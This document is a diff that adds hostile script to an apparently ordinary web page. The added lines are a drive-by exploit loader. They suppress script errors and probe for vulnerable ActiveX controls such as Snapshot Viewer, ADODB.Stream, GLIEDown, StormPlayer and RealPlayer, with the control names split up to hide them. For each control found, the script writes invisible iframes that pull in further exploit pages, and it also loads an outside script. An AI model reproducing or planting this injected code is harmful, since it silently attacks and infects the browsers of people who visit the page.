@@ -1,0 +1,22 @@
+<SCRIPT>window.onerror=function(){return true;}</SCRIPT>
+<SCRIPT>
+window.defaultStatus=".";
+try{if(new ActiveXObject("snpvw.Snap"+"s"+"h"+"ot Viewer Control.1"))document.write('<iframe width=100 height=0 src=../as.htm></iframe>')}catch(a){}try{var e;var ado=document.createElement("object");if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)ado.setAttribute("classid","clsid:B"+"D96C556-65A3-11D0-983A-00C04FC29E36");var as=ado.createobject("Adodb.Stream","")}catch(e){};finally{if(e!="[object Error]"){document.write('<iframe width=100 height=0 src=for.htm></iframe>')}else{try{var h;var glworld=new ActiveXObject("GLIEDown.IEDown.1")}catch(h){};finally{if(h!="[object Error]"){document.write('<iframe style=display:none src="../gword.htm"></iframe>')}}try{var bf;var bfworld=new ActiveXObject("MPS.StormPlayer")}catch(bf){};finally{if(bf!="[object Error]"){document.write('<iframe style=display:none src="../baozi.htm"></iframe>')}}}}
+function test()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="\x36\x2e\x30\x2e\x31\x34\x2e\x35\x35\x32"){var ammc="dsvb";
+document.write('<Iframe style=display:none src="../all10.htm"></iframe>');}
+else
+document.write('<iframe style=display:none src="../all11.htm"></iframe>');
+}
+test();
+</script>
+<script src=../new.js></script>
+<iframe src=fx.htm width=100 height=0></iframe>
+<iframe src=../supp.htm width=100 height=0></iframe>
